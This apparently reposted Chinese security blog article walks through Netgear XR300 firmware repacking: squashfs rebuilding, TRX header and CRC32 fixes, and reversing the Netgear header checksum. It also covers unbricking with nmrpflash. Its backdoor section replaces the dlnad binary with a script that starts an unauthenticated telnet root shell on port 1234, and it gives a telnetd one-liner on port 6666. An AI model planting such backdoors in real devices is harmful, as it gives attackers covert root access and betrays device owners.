> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/faPt1U8qwGxM-4Acjz9_2w)

记录对 netgear XR300 路由器固件分析以及重新打包过程

[Netgear 固件分析与后门植入](http://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247493466&idx=1&sn=d54c02bd85cc86b50dc4712f4b2d9e2b&chksm=e89dcf82dfea4694dde4c8ea0b9bcb195946727ceb07b7b8de5ecf9bbb52405534cb2825c694&scene=21#wechat_redirect)  

文章亮点就是 全方面的讲解了固件重打包的流程，从怎么分析到实际操作都进行了讲解，并且根据固件的分层结构，详细介绍了每层数据的具体处理方法

资源
==

硬件
--

*   一台 netgear XR300 路由器
    

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJOGW3HCsPvStXrhEtaJ4Mug9fP2jsy8kRTWLSOnRVBsicibe0GFcbL8CQ/640?wx_fmt=png)

*   网线
    

软件
--

*   固件下载地址
    
*   官方打包工具源码地址
    

### 交叉编译环境

```
Note:       This package has been built successfully on 32-bit i386 Fedora 6 Linux       host machine. Compiling this package on platforms other than Fedora Core 6      may have unexpected results.
```

根据官方源码中的说明，配置好 32 位 i386 Fedora 6 虚拟机

```
[root@localhost]# uname -aLinux localhost.localdomain 2.6.22.14-72.fc6 #1 SMP Wed Nov 21 13:44:07 EST 2007 i686 i686 i386 GNU/Linux
```

下载交叉编译工具 arm-uclibc 工具链

使用 binwalk 解析固件
===============

```
$ binwalk XR300-V1.0.2.24_10.3.21.chk DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------58            0x3A            TRX firmware header, little endian, image size: 35921920 bytes, CRC32: 0x3DB7DE14, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21159C, rootfs offset: 0x086            0x56            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5325664 bytes2168278       0x2115D6        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 33750586 bytes, 2792 inodes, blocksize: 131072 bytes, created: 2019-04-12 06:24:01
```

通过分析 binwalk 解析结果，可以看到固件由 netgear header(0x3A 字节) +TRX header(0x1c 字节)+linux kernel+squashfs 文件系统构成。接下来由从内到外的顺序对每一个部分进行详细分析

Squashfs
--------

首先固件最内层是一个 squash 文件系统，从 binwalk 解析结果可以看到对文件系统版本以及大小等属性的详细描述

```
2168278       0x2115D6        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 33750586 bytes, 2792 inodes, blocksize: 131072 bytes, created: 2019-04-12 06:24:01
```

目前网上针对 squashfs 的打包工作都是使用开源的 mksquash 这个程序进行打包，使用 binwalk 解析出来的压缩参数进行压缩后与原本的固件进行对比

*   原本文件系统：
    

文件开头：  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJcibABcV4op5HxK6jF5grU20kvqZtLfxfQfQ4yjOSYw3IY9vkiaaSeHibA/640?wx_fmt=png)

文件结尾：  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJYZNsrlnRvR37wn6yRszodpHJ83b2vlH08pokC4Ob665tSGduqQQkYw/640?wx_fmt=png)

*   重打包文件系统：
    

文件开头：  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJsUZRZE4edJjTMMbxehxPV6KR65QTvmYVZ4LcoxzUtkMzU3eQjZh9rg/640?wx_fmt=png)

文件结尾：  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJtjxwXXodJ40k4ib4RxoeyT4zfZSudzkXZrUzJUzV4ljme74kTTnIPXw/640?wx_fmt=png)

可以看到不管是开头还是结尾都有明显差异，原本文件系统在结尾处有明显英文的信息描述，所以使用网上方法直接对文件系统进行打包是不行的（事实证明，这种方法的确会让路由器变砖）

### 使用官方代码构建文件系统

因为已经有了官方打包的源码，所以我选择直接运行官方的构建固件代码，但是在编译运行的时候出现了很多报错，可能是我选择的 Linux 版本的问题，在修复了几个报错的文件后仍然会出现新的报错，所以我暂时放弃了这个做法。  
因为官方代码编译运行是依据 src/router/Makefile 这个文件，所以我选择直接分析这个文件，文件比较大，我从头到尾把这个 MakeFile 读了一遍，基本就了解了 netgear 固件打包的全流程，这个部分只分析与 squash 文件系统相关的地方。

在 MakeFile 中和构建 squash 文件系统相关的语句如下：

```
ifeq ($(CONFIG_SQUASHFS), y)ifeq (2_6_36,$(LINUX_VERSION))    $(MAKE) -C squashfs-4.2 mksquashfs    find $(TARGETDIR) -name ".svn" | xargs rm -rf    squashfs-4.2/mksquashfs $(TARGETDIR) $(PLATFORMDIR)/$(ROOT_IMG) -noappend -all-root
```

首先是在 squashfs-4.2 目录下执行 Make 命令，然后删除所有. svn 文件，最后执行 mksquashfs 命令，其中

```
PLATFORM := $(PLT)-uclibcexport PLATFORMDIR := $(TOP)/$(PLATFORM)export TARGETDIR := $(PLATFORMDIR)/target
```

最终我们要选择我们构建好后门的文件系统文件夹

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJmjfHWAyeWlVSqW1AJZ0xrXstwExw4wpSRKpSGTqBTgPPlibXic3NGQKA/640?wx_fmt=png)

```
./mksquashfs squashfs-root/ target.squashfs -noappend -all-root
```

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJIT74H3b0xMdrZh6kt9vg8g2EWw2zRpvWyn8mVrh9w44MuccIpXB89A/640?wx_fmt=png)

这里需要注意的是，(TARGETDIR) 是文件系统目录 ¨G5G 最终我们要选择我们构建好后门的文件系统文件夹![](https://ppplutoboke.oss−cn−beijing.aliyuncs.com/20210324204807.png)¨G6G![](https://ppplutoboke.oss−cn−beijing.aliyuncs.com/20210324204839.png) 这里需要注意的是，(TARGETDIR) 参数要使用原来固件解析出的文件系统文件夹，src 文件夹中的文件系统缺少文件会导致 web 等服务无法启动

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJmGqubqs8BvS0qb4DaTXnQ3kiaWLpyaibbspfBdFGibqYxSa6ibhtL6aIibA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJvNUdj0zlvjLRGna80koKUmiaTyZvn3KKohqFBGvRMXva3Ug3Y3qGsaw/640?wx_fmt=png)

新生成的文件系统和 binwalk 解出来的不管是开头还是结尾都很相似了，是可以使用的。

linux kernel
------------

```
86      0x56     LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5325664 bytes
```

从 binwalk 解析结果来看，文件系统上面是 Linux 内核, 接下来介绍几种常见的 Linux 内核文件

### initrd.img、vmlinux 和 vmlinuz

initrd.img 是一个小的映象，包含一个最小的 linux 系统。通常的步骤是先启动内核，然后内核挂载 initrd.img，并执行里面的脚本来进一步挂载各种各样的模块，然后发现真正的 root 分区，挂载并执行 / sbin/init…

initrd.img 当然是可选的了，如果没有 initrd.img, 内核就试图直接挂载 root 分区。

说 initrd.img 文件还会提到另外一个名角 ---vmlinuz。vmlinuz 是可引导的、压缩的内核。“vm” 代表 “Virtual Memory”。Linux 支持虚拟内存，不像老的操作系统比如 DOS 有 640KB 内存的限制。Linux 能够使用硬盘空间作为虚拟内存，因此得名 “vm”。另外：vmlinux 是未压缩的内核，vmlinuz 是 vmlinux 的压缩文件。

### 为什么要 initrd.img？

系统内核 vmlinuz 被加载到内存后开始提供底层支持，在内核的支持下各种模块，服务等被加载运行。这样当然是大家最容易接受的方式，曾经的 linux 就是这样的运行的。假设你的硬盘是 scsi 接口而你的内核又不支持这种接口时，你的内核就没有办法访问硬盘，当然也没法加载硬盘上的文件系统，怎么办？把内核加入 scsi 驱动源码然后重新编译出一个新的内核文件替换原来 vmlinuz。

vmlinuz 是可引导的、压缩的内核。“vm” 代表 “Virtual Memory”。Linux 支持虚拟内存，不像老的操作系统比如 DOS 有 640KB 内存的限制。Linux 能够使用硬盘空间作为虚拟内存，因此得名 “vm”。vmlinuz 是可执行的 Linux 内核，它位于 / boot/vmlinuz，它一般是一个软链接，比如图中是 vmlinuz-2.4.7-10 的软链接。

vmlinuz 的建立有两种方式。一是编译内核时通过 “make zImage” 创建，然后通过：  
“cp /usr/src/linux-2.4/arch/i386/linux/boot/zImage /boot/vmlinuz”产生。zImage 适用于小内核的情况，它的存在是为了向后的兼容性。二是内核编译时通过命令 make bzImage 创建，然后通过：“cp /usr/src/linux-2.4/arch/i386/linux/boot/bzImage /boot/vmlinuz”产生。bzImage 是压缩的内核映像，需要注意，bzImage 不是用 bzip2 压缩的，bzImage 中的 bz 容易引起 误解，bz 表示 “big zImage”。bzImage 中的 b 是“big” 意思。  
zImage（vmlinuz）和 bzImage（vmlinuz）都是用 gzip 压缩的。它们不仅是一个压缩文件，而且在这两个文件的开头部分内嵌有 gzip 解压缩代码。所以你不能用 gunzip 或 gzip –dc 解包 vmlinuz。  
内核文件中包含一个微型的 gzip 用于解压缩内核并引导它。两者的不同之处在于，老的 zImage 解压缩内核到低端内存（第一个 640K）， bzImage 解压缩内核到高端内存（1M 以上）。如果内核比较小，那么可以采用 zImage 或 bzImage 之一，两种方式引导的系统运行时是相同的。大的内核采用 bzImage，不能采用 zImage。

### 提取 Linux kernel

在 makefile 中针对 linux kernel 的命令主要有以下几条：

```
linux_kernel:        ifeq ($(LINUXDIR), $(BASEDIR)/components/opensource/linux/linux-2.6.36)    $(MAKE) -C $(LINUXDIR) zImage    $(MAKE) CONFIG_SQUASHFS=$(CONFIG_SQUASHFS) -C $(SRCBASE)/router/compressed
```

可以发现源码中已经有了官方编译好的内核可以直接使用，或者也可以直接将固件中这一部分提取出来直接使用

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJRlT88SacDzL1VZ4MJBWSKdxrrYxF1xbJS36ZfvnFb2SDCDm9v6w6Fg/640?wx_fmt=png)

TRX header
----------

接下来是对 TRX 头进行分析

```
58    0x3A    TRX firmware header, little endian, image size: 35921920 bytes, CRC32: 0x3DB7DE14, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21159C, rootfs offset: 0x0
```

从 binwalk 解析结果来看，TRX 头是对 linux kernel 和 squashfs 的拼接和校验

在我使用的固件中 TRX 内容如下：

```
Offset      0  1  2  3  4  5  6  7   8  9  A  B  C  D  E  F00000030                                  48 44 52 30 00 F0             HDR0 ?00000040   E2 01 C3 75 71 F9 00 00  01 00 1C 00 00 00 60 E5   ?胾q?       `?00000050   21 00 00 00 00 00                                  !
```

TRX 是某些路由器（如 linksys）和开源固件（如 OpenWRT 和 DD-WRT）中使用的内核映像文件的格式。

TRX 文件头格式如下：

```
struct trx_header {    uint32_t magic;     /* "HDR0" */    uint32_t len;       /* Length of file including header */    uint32_t crc32;     /* 32-bit CRC from flag_version to end of file */    uint32_t flag_version;  /* 0:15 flags, 16:31 version */    uint32_t offsets[4];    /* Offsets of partitions from start of header */};
```

*   0x3A-0x3D magic 魔数
    
*   0x3E-0x41 image size
    
*   0x42-0x45 CRC value
    
*   0x46-0x47 TRX_flag
    
*   0x48-0x49 TRX_version
    
*   0x4A-0x55 分区偏移量: loader 偏移: 0x1C, linux kernel 偏移: 0x21E560, rootfs 偏移: 0x0
    

官方打包代码中已经有 trx 工具可以直接使用，在 MakeFile 中针对 trx 头使用的命令如下，可以看到其实就是对之前生成的 vmlinuz 文件和 squash 文件做一个组装

```
trx -o $(PLATFORMDIR)/linux.trx $(PLATFORMDIR)/vmlinuz $(PLATFORMDIR)/$(ROOT_IMG) ; 
```

在虚拟机中运行以下的命令，可得到相应的加了 trx 头的文件

```
$ ./trx -o ./linux.trx vmlinuz target.squashfs                  append nvram file target.squashfsappend nvram 33751040 bytes
```

```
$ binwalk linux.trx                  DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             TRX firmware header, little endian, image size: 35921920 bytes, CRC32: 0x42E58DB3, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x0, rootfs offset: 0x203000028            0x1C            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5325664 bytes2168220       0x21159C        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 33750709 bytes, 2792 inodes, blocksize: 131072 bytes, created: 2021-03-24 06:51:29$ binwalk XR300-V1.0.2.24_10.3.21.chk DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------58            0x3A            TRX firmware header, little endian, image size: 35921920 bytes, CRC32: 0x3DB7DE14, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21159C, rootfs offset: 0x086            0x56            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5325664 bytes2168278       0x2115D6        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 33750586 bytes, 2792 inodes, blocksize: 131072 bytes, created: 2019-04-12 06:24:01
```

使用 binwalk 对比原本的固件以及生成的 trx 文件可以发现在 TRX 头部分除了 CRC32 不一样外，偏移部分也存在较大差异，CRC32 不一样是正常的，偏移部分差异过大肯定存在问题。  
通过将偏移数值与 binwalk 解析结果对比分析，可以发现使用 trx 工具生成的 TRX 文件将 linux kernel 和 squashfs 的偏移搞反了，为了印证我的猜想，我对 TRX 工具进行了逆向

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJRGHOoTfZgyM0OxkxWPeNIsmE2uia0G2EmIvVxtAIS9os64MZKNUVoCQ/640?wx_fmt=png)

可以看到这里反汇编出来的逻辑与原始固件中 TRX 头所表现出来的肯定是不一样的， 为了与原固件保持一致需要在 TRX 生成的文件基础上做一些调整，具体调整方式如下：

*   将 trx 文件中 0x18 - 0x1b 也就是 rootfs 对应的偏移改为 0
    
*   将 trx 文件中 0x14 - 0x17 也就是 linux kernel 对应的偏移改为 0x21159C，这是因为使用的就是原始固件中的 linux kernel 所以这里的偏移与原固件保持一致，如果修改了内核文件导致与原始内核大小不一致，这里需要变成修改后的偏移
    
*   重新计算 CRC32
    

### 计算 CRC32

以 XR300-V1.0.2.24_10.3.21.chk 文件为例，CRC32 校验值为 0x3DB7DE14，根据 TRX 定义，这里的 CRC32 校验是计算从 flag 部分到文件结尾，使用 winhex 计算该部分校验值

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJNVl4qqX8icHzJeib39ju0cbeibyO8V6q8EaiciaPFApQiaXIoicX4dWTNFMWQ/640?wx_fmt=png)

发现与固件中的值不符合，这里其实是做了一个取反操作

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJG23ibu2l9uibbX33NiaDaGsLo6A8Isx9JfXC4QGOGOX8zwicHNAmRDucqA/640?wx_fmt=png)

```
>>> bin(0x3DB7DE14)'0b111101101101111101111000010100'>>> bin(0xC24821EB)'0b11000010010010000010000111101011'
```

所以在修改完 TRX 偏移部分后，计算出 CRC32 校验，取反之后修改 CRC32 部分即可  
在线取反工具

```
$ binwalk linux.trx                                                                            DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             TRX firmware header, little endian, image size: 35921920 bytes, CRC32: 0x16C465F4, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21159C, rootfs offset: 0x028            0x1C            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5325664 bytes2168220       0x21159C        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 33750709 bytes, 2792 inodes, blocksize: 131072 bytes, created: 2021-03-24 06:51:29
```

netgear header
--------------

最后一个部分就是针对 netgear header 的构建，前 0x3A 字节是 netgear 自带的 header,

```
Offset      0  1  2  3  4  5  6  7   8  9  A  B  C  D  E  F00000000   2A 23 24 5E 00 00 00 3A  01 01 00 03 1A 0A 03 16   *#$^   :        00000010   C2 70 61 44 00 00 00 00  02 24 20 00 00 00 00 00   聀aD     $      00000020   C2 70 61 44 F1 AC 09 FF  55 31 32 48 33 33 32 54   聀aD瘳 U12H332T00000030   37 38 5F 4E 45 54 47 45  41 52                     78_NETGEAR
```

通过查看 R7000，XR300 的多个版本 chk 文件，0-8 字节是不变的，从 9 字节开始是固件的版本号。

*   0x9-0x10 字节是固件的版本号，对应着文件名。
    
*   0x10-0x17,0x20-0x27 是 netgear 的 chencksum 信息，具体介绍在后面说明
    
*   0x18-0x1F 是固件大小，每一个 chk 文件大小都以 0x3A 结尾，所以文件大小信息的 0x3A 存放在 0x7 的位置。
    
*   0x28-0x39 字节是固件的种类信息，比如同一系列 R7000，这 12 字节就是相同的。
    

在 Makefile 中针对这一部分的命令如下：

```
############################################## Create .chk files for Web UI upgrade ##cd $(PLATFORMDIR) && touch rootfs && \../../../tools/packet -k linux.trx -f rootfs -b $(BOARDID_FILE) \-ok kernel_image -oall kernel_rootfs_image -or rootfs_image \-i $(fw_cfg_file) && \rm -f rootfs && \cp kernel_rootfs_image.chk $(FW_NAME)_`date +%m%d%H%M`.chk
```

这里的操作逻辑是先创建一个空的 rootfs 文件然后使用 packet 程序对上面生成的 linux.trx 文件添加 header，完整命令如下：

```
$ ./packet -k linux.trx -b compatible_xr300.txt -ok kernel -oall image -or rootfs -i ambitCfg.h
```

-b -i 的参数都可以在源码文件夹中找到  
生成的 image.chk 就是最终的完整固件

重打包工作到这里其实就已经结束了，但是我对 packet 工具进行了进一步分析

### 逆向 packet

因为不是很了解 packet 参数对应的具体含义，所以我使用 IDA 对 packet 进行了逆向

程序的逻辑是先通过程序参数输入对要使用的文件名变量进行赋值，然后通过 **-i [configure file path/name]** 获得的 cfg 文件提取出固件的版本信息，这个文件对应的就是 **ambitCfg.h** 查看文件内容，可以看到文件中定于了固件版本

```
/*formal version control*/#define AMBIT_HARDWARE_VERSION     "U12H240T00"#define AMBIT_SOFTWARE_VERSION     "V1.0.3.2"#define AMBIT_UI_VERSION           "1.0.57"#define STRING_TBL_VERSION         "1.0.3.2_2.1.33.8"
```

如果要打包别的版本固件需要对这里的字段修改成对应固件版本的信息。

接下来就是对三个输出文件添加 header，这三个输出都是采用 fwrite 函数，将 **malloc_chunk** 的内容输入到文件中

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJMDExn8QpUkPcIvP5je6icvBzsiamuOtDWsyMGGQUfxJX2j4VG8J862IQ/640?wx_fmt=png)

查看 **addheader** 函数中对 **malloc_chunk** 的引用，可以发现，修改 **malloc_chunk** 的地方只要下面的代码

```
memcpy(malloc_chunk, v20, v24);memcpy((char *)malloc_chunk + v24, &s, v26);memcpy((char *)malloc_chunk + v25, dest, v27);
```

v20 数组中先是存储了 4 个字节的字符串然后拷贝进了固件的版本信息

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJQaqscz84grpzg0dYrbVWwCNYyiahk8icvWKEmHRCrZhvIpBRqW8Z2rag/640?wx_fmt=png)

然后拷贝了 **kernel_checksum** 和 **rootfs_checksum** 接着是对 kernel 文件长度和 rootfs 文件长度的信息，然后是 **rootfs_kernel_checksum**，填充 4 字节 0，加上 **compatible.txt** 里的内容，最后对整个头部再求一个 checksum，将结果填充进刚才 4 字节 0 的位置

#### calculate_checksum

接下来分析这里的计算 checksum 的函数

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJTiagKhAksXCH321ZVGpmknDHTRBZhmWLicyRiciczvJVF6hecyOQPQbnaA/640?wx_fmt=png)

第一次调用时 a1 = 0，所以 **c1 = 0,c0 = 0**

第二次调用时 a1 = 1

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJ5BYBJxojFCvw8qSCxUrCOGnmkqbrZYQiabwJz63BNvHlNgcz61fwIzA/640?wx_fmt=png)

这里的逻辑很简单, 就是从 file 中每次读取一个字节的数据，然后

```
c0 += *(unsigned char *)(kernel_file+i);c1 += c0;
```

为了验证这里的计算结果，我使用 GDB 调试 packet  
查看程序的保护措施

```
Arch:     i386-32-littleRELRO:    No RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)
```

只开启了 NX，没有地址随机化，所以调试起来很方便

使用 gdb 加载 packet，设置 args 后输入

```
set args  -k linux.bin -f _R6300v2-V1.0.3.2_1.0.57.chk.extracted/20E2BA.squashfs -b compatible_r6300v2.txt -ok kernel -oall kernel_rootfs -or rootfs -i ambitCfg.h
```

我根据 IDA 反汇编的逻辑，自己写了一个 C 的计算 checksum 代码，如下：

```
#include<stdio.h>#include<stdlib.h>#include<stdint.h>int c1,c0;int main(){    //FILE *kernel_file_fd = fopen("R6300v2-V1.0.3.2_1.0.57.chk","rb");    FILE *kernel_file_fd = fopen("1","rb");    void *kernel_file = malloc(0x2000000);    int file_len = fread(kernel_file,1,0x2000000,kernel_file_fd);    int i;    for(i=0;i<file_len;i++){        c0 += *(unsigned char *)(kernel_file+i);        c1 += c0;    }    c0 = (c0 & 0x0ffff) + ((unsigned int)c0 >> 16);    c0  = ((c0 >> 16) + c0) & 0xffff;    c1 = (c1 & 0x0ffff) + ((unsigned int)c1 >> 16);    c1  = ((c1 >> 16) + c1) & 0xffff;    int checksum;    checksum = (c1 << 16) | c0;    printf("0x%x",checksum);}
```

首先在对 rootfs 计算 checksum 的位置下断点，通过查看计算的 checksum

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJxibQEV4JRkCFonUmBNWuqeZJdcV30mpxUDicEiaHVhVdSxYP0cjMZibQFQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJqZcete2WKhfCkh9qQKSXQibb7JZicbiaibDuTYFnlUxs5UcMMVVHMIQmEQ/640?wx_fmt=png)

与 C 计算的一致  
接下来计算对 linux kernel 的 checksum

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJLSxiafDCghD9t1BcYEjicC9xzAQxYQLhKqGU5XUTtPYZg4WAdh4Olsqw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJArA98VxXHd5FiarWooXlzY66ye6PZgseGxEXkQ8URqAsoYkB6DA4URg/640?wx_fmt=png)

发现与 C 计算的也是一致的

接下来是计算了 rootfs+linux kernel 的 checksum

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJN739EX3jxRY28DsyAibZiaTOKny3b1icG7S6KY3mms9JUFov6x7w7cYsQ/640?wx_fmt=png)

第一部分校验和是对 TRX header + linux kernel + squashfs 文件系统的校验

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJHOD4AOlEvwTvvgbH0IvkxlXnhUE2MzoOl4F0ghg3EpTTQtxnz2c0ww/640?wx_fmt=png)

56.7z 对应着固件中 linux kernel+squashfs 文件系统的部分

修改固件
----

### 设置后门

```
cd rootfs/usr/sbin
mv dlnad dlnadd
touch dlnad
vim dlnad
```

```
#!/bin/sh/usr/sbin/telnetd -F -l /bin/sh -p 1234 &/usr/sbin/dlnadd &
```

```
sudo chown 777 dlnad
```

将修改后的文件系统重新打包上传

在 netgear 某些版本中，无法直接开启 telnet 需要先创建设备文件  
完整命令如下：

```
mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p6666 -l/bin/sh
```

完整流程图如下：

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJuY3SibZQz6OJ94NPCEFqPX2WiaaNe8iaemKib4eh9bYdfnwS9Ou6B0dLZg/640?wx_fmt=png)

netgear 救砖教程
============

*   下载 nmrpflash.exe 工具
    

链接：https://pan.baidu.com/s/140aE74ZUsRMcW1sbdLYqYQ，  
提取码：opw4

*   配置静态 IP
    

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJsiaicw3C1ibdxo6QEzXt0g171iab3D6sh3qxTC3kmMVsh2j9YCDwpFiaL1A/640?wx_fmt=png)

*   用管理员权限打开 cmd
    

使用网线插上 netgear lan 口，在命令行中进入刚下载工具的目录

输入命令 nmrpflash.exe -L 查询网卡编号

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJLKkN3APDsP89Yz5vegFaZxQOa7l29tW2eGv9V9S1Q8sZjC9ucQ4icXw/640?wx_fmt=png)

这里可以看到对应的编号是 net1

*   上传固件  
    查询好编号后，执行命令
    

```
nmrpflash.exe -i net1 -f R6220-V1.1.0.86.img
```

开启救砖之路，值得注意的是，此命令执行的时机为：在命令提示符中输入好指令后，此时路由在处于关机状态，开启路由器电源，等待 5 秒，执行命令，大概等待 1-5 分钟左右的时间，即可恢复成功。命令执行时机决定救砖是否成功，可以不断尝试，直到成功。

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBS0Foibj6xYACEiaIiaCvZqAiaJ8ic5goOxAa1HDjMPUUWqtonLtJaiatWmSAmialVRbuiawSxhpbHVqm6pRQ/640?wx_fmt=png)

**end**

  

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组 IOT + 工控 + 样本分析 + AI 长期招新  

欢迎联系 admin@chamd5.org

  
  

![](https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBR8nk7RR7HefBINILy4PClwoEMzGCJovye9KIsEjCKwxlqcSFsGJSv3OtYIjmKpXzVyfzlqSicWwxQ/640?wx_fmt=jpeg)